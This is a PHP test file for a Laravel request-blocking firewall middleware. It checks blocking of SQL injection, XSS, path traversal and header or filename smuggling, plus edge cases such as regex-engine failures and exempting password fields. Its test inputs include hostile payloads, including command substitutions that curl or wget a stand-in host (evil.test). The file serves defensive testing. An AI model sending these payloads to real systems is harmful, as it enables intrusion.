<?php

use App\Http\Middleware\BlockMaliciousRequests;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Http\Response;
use Illuminate\Http\UploadedFile;
use Symfony\Component\HttpKernel\Exception\HttpException;

test('passes a clean request through', function () {
    $request = Request::create('/admin/login', 'GET');

    $response = (new BlockMaliciousRequests)->handle($request, fn ($req) => new Response('ok'));

    expect($response->getContent())->toBe('ok');
});

test('blocks a SQL injection payload in the query string', function () {
    $request = Request::create('/admin/login', 'GET', ['id' => '1 OR 1=1']);

    (new BlockMaliciousRequests)->handle($request, fn ($req) => new Response('ok'));
})->throws(HttpException::class);

test('blocks an XSS payload in the request body', function () {
    $request = Request::create('/admin/login', 'POST', ['comment' => '<script>alert(1)</script>']);

    (new BlockMaliciousRequests)->handle($request, fn ($req) => new Response('ok'));
})->throws(HttpException::class);

test('blocks a path traversal attempt in the URI', function () {
    $request = Request::create('/files/../../etc/passwd', 'GET');

    (new BlockMaliciousRequests)->handle($request, fn ($req) => new Response('ok'));
})->throws(HttpException::class);

test('blocks a command substitution payload in the request body', function () {
    $request = Request::create('/admin/login', 'POST', ['note' => 'ok; $(curl http://evil.test/x)']);

    (new BlockMaliciousRequests)->handle($request, fn ($req) => new Response('ok'));
})->throws(HttpException::class);

test('blocks a backtick command substitution payload in the request body', function () {
    $request = Request::create('/admin/login', 'POST', ['note' => 'ok `id`']);

    (new BlockMaliciousRequests)->handle($request, fn ($req) => new Response('ok'));
})->throws(HttpException::class);

test('blocks a bare wget/curl download payload in the request body', function () {
    $request = Request::create('/admin/login', 'POST', ['note' => 'wget http://evil.test/shell.sh']);

    (new BlockMaliciousRequests)->handle($request, fn ($req) => new Response('ok'));
})->throws(HttpException::class);

test('skips the check for excluded paths', function () {
    config(['waf.exclude_paths' => ['telescope*']]);

    $request = Request::create('/telescope/requests', 'GET', ['id' => '1 OR 1=1']);

    $response = (new BlockMaliciousRequests)->handle($request, fn ($req) => new Response('ok'));

    expect($response->getContent())->toBe('ok');
});

test('allows every request when disabled', function () {
    config(['waf.enabled' => false]);

    $request = Request::create('/admin/login', 'GET', ['id' => '1 OR 1=1']);

    $response = (new BlockMaliciousRequests)->handle($request, fn ($req) => new Response('ok'));

    expect($response->getContent())->toBe('ok');
});

test('a real request carrying a SQL injection payload is rejected with a 403', function () {
    $response = $this->get('/admin/login?search='.urlencode('1 UNION SELECT * FROM users'));

    $response->assertForbidden();
});

test('the login page still renders normally through the full middleware stack', function () {
    $response = $this->get('/admin/login');

    $response->assertOk();
});

test('a payload carrying invalid UTF-8 does not disable the body check', function () {
    // The subject used to be json_encode($request->all()), which returns false
    // for any invalid UTF-8 byte; the "?: ''" fallback then dropped the whole
    // body from the scan, so one stray byte switched off every input check.
    $request = Request::create('/admin/login', 'POST', ['q' => "\xB1\xFF 1 UNION SELECT x FROM y"]);

    (new BlockMaliciousRequests)->handle($request, fn ($req) => new Response('ok'));
})->throws(HttpException::class);

test('blocks a percent-encoded path traversal', function () {
    $request = Request::create('/files/%2e%2e%2fetc/passwd', 'GET');

    (new BlockMaliciousRequests)->handle($request, fn ($req) => new Response('ok'));
})->throws(HttpException::class);

test('blocks a double percent-encoded path traversal', function () {
    $request = Request::create('/files/%252e%252e%252fetc/passwd', 'GET');

    (new BlockMaliciousRequests)->handle($request, fn ($req) => new Response('ok'));
})->throws(HttpException::class);

test('the shipped config inspects the user agent and referer headers', function () {
    expect(config('waf.inspect_headers'))->toBe(['user-agent', 'referer']);
});

test('blocks an attack signature smuggled through an inspected header', function () {
    $request = Request::create('/admin/login', 'GET');
    $request->headers->set('User-Agent', 'sqlmap/1.0 union select 1');

    (new BlockMaliciousRequests)->handle($request, fn ($req) => new Response('ok'));
})->throws(HttpException::class);

test('blocks an attack signature smuggled through the referer', function () {
    $request = Request::create('/admin/login', 'GET');
    $request->headers->set('Referer', 'https://warehouse.test/?q=<script>alert(1)</script>');

    (new BlockMaliciousRequests)->handle($request, fn ($req) => new Response('ok'));
})->throws(HttpException::class);

test('leaves headers outside waf.inspect_headers alone', function () {
    // Cookies and framework tokens carry opaque payloads; scanning them would
    // only produce false positives, so they are deliberately not inspected.
    config(['waf.inspect_headers' => ['user-agent']]);

    $request = Request::create('/admin/login', 'GET');
    $request->headers->set('X-Custom', 'union select 1');

    $response = (new BlockMaliciousRequests)->handle($request, fn ($req) => new Response('ok'));

    expect($response->getContent())->toBe('ok');
});

test('blocks an attack signature in an uploaded filename', function () {
    // No slash in the payload on purpose: Symfony's UploadedFile basenames the
    // client-supplied name (everything up to the last "/" is dropped), so a
    // "</script>" here would reach the middleware as "script>" and match nothing.
    $request = Request::create('/upload', 'POST', files: [
        'document' => UploadedFile::fake()->create('1 union select 1.csv'),
    ]);

    (new BlockMaliciousRequests)->handle($request, fn ($req) => new Response('ok'));
})->throws(HttpException::class);

test('blocks the request when the regex engine fails instead of treating it as clean', function () {
    // preg_match() returns false (not 0) when PCRE gives up — here because a
    // /u pattern is matched against invalid UTF-8, the same class of failure a
    // padded payload causes by blowing the backtrack limit. Reading that as
    // "no match" would let an attacker turn the check off by making it fail.
    config(['waf.patterns' => ['sql_injection' => ['/union\s+select/iu']]]);

    $request = Request::create('/admin/login', 'GET', ['q' => "\xFF\xFE"]);

    (new BlockMaliciousRequests)->handle($request, fn ($req) => new Response('ok'));
})->throws(HttpException::class);

test('the excluded telescope path does not exempt look-alike paths', function () {
    config(['waf.exclude_paths' => ['telescope', 'telescope/*']]);

    $request = Request::create('/telescopefoo', 'GET', ['id' => '1 OR 1=1']);

    (new BlockMaliciousRequests)->handle($request, fn ($req) => new Response('ok'));
})->throws(HttpException::class);

test('a clean request with an ordinary user agent and query string passes', function () {
    $request = Request::create('/admin/products', 'GET', ['search' => 'Widget 12"']);
    $request->headers->set('User-Agent', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36');
    $request->headers->set('Referer', 'https://warehouse.test/admin?page=2');

    $response = (new BlockMaliciousRequests)->handle($request, fn ($req) => new Response('ok'));

    expect($response->getContent())->toBe('ok');
});

test('the shipped config skips only the credential input keys', function () {
    expect(config('waf.skip_input_keys'))->toBe(['password', 'password_confirmation', 'current_password']);
});

test('a password holding a command substitution payload is not treated as an attack', function () {
    // Production Password::defaults() requires symbols, so a password-manager
    // value carrying a backtick or "$(...)" is ordinary input — scanning it
    // produced a bare 403 before routing, with no error the form could show.
    $request = Request::create('/admin/login', 'POST', [
        'email' => 'admin@example.com',
        'password' => 'x`id`$(whoami)y',
    ]);

    $response = (new BlockMaliciousRequests)->handle($request, fn ($req) => new Response('ok'));

    expect($response->getContent())->toBe('ok');
});

test('a skipped key is matched case-insensitively and inside a nested key path', function () {
    $request = Request::create('/admin/users', 'POST', [
        'users' => [['Password' => 'x`id`y']],
    ]);

    $response = (new BlockMaliciousRequests)->handle($request, fn ($req) => new Response('ok'));

    expect($response->getContent())->toBe('ok');
});

test('skipping the password value still leaves every other field on the request inspected', function () {
    $request = Request::create('/admin/login', 'POST', [
        'email' => "admin@example.com' union select 1",
        'password' => 'x`id`y',
    ]);

    (new BlockMaliciousRequests)->handle($request, fn ($req) => new Response('ok'));
})->throws(HttpException::class);

test('skipping is limited to the configured keys', function () {
    config(['waf.skip_input_keys' => ['current_password']]);

    $request = Request::create('/admin/login', 'POST', ['password' => 'x`id`y']);

    (new BlockMaliciousRequests)->handle($request, fn ($req) => new Response('ok'));
})->throws(HttpException::class);

test('an admin can log in through the full middleware stack with a symbol-heavy password', function () {
    $password = 'Str`ong`$(pass)word!9';
    $admin = User::factory()->create(['password' => $password]);

    $response = $this->post('/admin/login', [
        'email' => $admin->email,
        'password' => $password,
    ]);

    $response->assertRedirect(route('admin.dashboard'));
    $this->assertAuthenticatedAs($admin);
});
